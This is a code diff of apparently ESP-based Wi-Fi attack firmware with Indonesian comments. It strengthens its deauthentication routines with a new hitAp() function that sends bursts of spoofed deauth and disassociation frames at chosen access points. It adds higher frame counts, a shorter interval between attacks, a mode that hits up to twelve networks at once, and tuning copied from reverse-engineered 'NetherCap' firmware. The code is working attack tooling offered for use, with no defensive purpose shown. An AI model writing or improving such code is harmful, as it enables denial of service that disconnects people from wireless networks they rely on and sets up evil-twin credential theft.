@@ -187,66 +187,49 @@ void sendDeauth(uint8_t frameType, uint8_t reason, const uint8_t* bssid, uint8_t
   esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
 }
 
+// Tembak satu AP: n frame deauth (reason 2) lalu n frame disassoc (reason 2),
+// dengan delay(1) di antara setiap frame — sama seperti firmware NetherCap asli
+// (FUN_4020abac): tanpa jeda, SDK membuang sebagian besar frame yang di-queue.
+void hitAp(uint8_t idx, uint8_t n){
+  if(idx >= apCount || aps[idx].ch == 0) return;
+  for(uint8_t k = 0; k < n; k++){ sendDeauth(0xC0, 2, aps[idx].bssid, aps[idx].ch); delay(1); }
+  for(uint8_t k = 0; k < n; k++){ sendDeauth(0xA0, 2, aps[idx].bssid, aps[idx].ch); delay(1); }
+}
+
 void deauthSingleStep(){
-  if(singleIdx < 0 || singleIdx >= (int)apCount || aps[singleIdx].ch == 0) return;
-  esp_wifi_set_channel(aps[singleIdx].ch, WIFI_SECOND_CHAN_NONE);
-  delay(4);
-  const uint8_t* b = aps[singleIdx].bssid;
-  sendDeauth(0xC0, 7, b, aps[singleIdx].ch);
-  sendDeauth(0xC0, 1, b, aps[singleIdx].ch);
-  sendDeauth(0xA0, 7, b, aps[singleIdx].ch);
-  sendDeauth(0xA0, 1, b, aps[singleIdx].ch);
-  sendDeauth(0xC0, 2, b, aps[singleIdx].ch);
-  sentFrames += 5;
+  if(singleIdx < 0) return;
+  hitAp((uint8_t)singleIdx, 16);
 }
 
 void deauthAllStep(){
-  for(uint8_t k = 0; k < MAX_AP; k++){
-    rrIdx = (rrIdx + 1) % MAX_AP;
-    if(rrIdx >= apCount || aps[rrIdx].ch == 0) continue;
-    esp_wifi_set_channel(aps[rrIdx].ch, WIFI_SECOND_CHAN_NONE);
-    delay(4);
-    const uint8_t* b = aps[rrIdx].bssid;
-    sendDeauth(0xC0, 7, b, aps[rrIdx].ch);
-    sendDeauth(0xC0, 1, b, aps[rrIdx].ch);
-    sendDeauth(0xA0, 7, b, aps[rrIdx].ch);
-    sendDeauth(0xA0, 1, b, aps[rrIdx].ch);
-    sendDeauth(0xC0, 2, b, aps[rrIdx].ch);
-    sentFrames += 5;
-    return;
+  uint8_t hit = 0;
+  for(uint8_t i = 0; i < apCount && hit < 12; i++){
+    if(aps[i].ch == 0) continue;
+    hitAp(i, 8);
+    hit++;
   }
 }
 
 void deauthStep(){
   if(!deauthOn) return;
-  if(!deauthAll && targetIdx < 0) return;
-  if(millis() - lastDeauth < 400) return;
+  if(!deauthAll && singleIdx < 0 && targetIdx < 0) return;
+  if(millis() - lastDeauth < 150) return;
   lastDeauth = millis();
-  if(singleIdx >= 0){ deauthSingleStep(); return; }
-  if(deauthAll){ deauthAllStep(); return; }
 
-  // tembak semua BSSID dengan SSID sama (2.4/5 GHz, repeater, mesh)
-  uint8_t hit = 0;
-  for(int i = 0; i < (int)apCount && hit < 4; i++){
-    if(strcmp(aps[i].ssid, aps[targetIdx].ssid) != 0) continue;
-    if(aps[i].ch == 0) continue;
-    const uint8_t* b = aps[i].bssid;
-    uint8_t ch = aps[i].ch;
-    delay(4);                        // radio settle setelah pindah kanal
-    sendDeauth(0xC0, 7, b, ch);
-    sendDeauth(0xC0, 1, b, ch);
-    sendDeauth(0xA0, 7, b, ch);
-    sendDeauth(0xA0, 1, b, ch);
-    sendDeauth(0xC0, 2, b, ch);
-    hit++;
+  if(singleIdx >= 0){
+    deauthSingleStep();
+  } else if(deauthAll){
+    deauthAllStep();
+  } else {
+    uint8_t hit = 0;                       // mode target + BSSID kembarannya
+    for(uint8_t i = 0; i < apCount && hit < 4; i++){
+      if(strcmp(aps[i].ssid, aps[targetIdx].ssid) != 0) continue;
+      hitAp(i, 16);
+      hit++;
+    }
   }
-  sentFrames += hit * 5;
-
-  // tetap di kanal target selama menyerang (bukan balik ke kanal 1)
-  if(!deauthOn && !twinOn) esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
 }
 
-// ---------------- tombol fisik ----------------------------------------------
 int readButton(){
 #if BTN_ADC
   int v = analogRead(BTN_PIN_ADC);
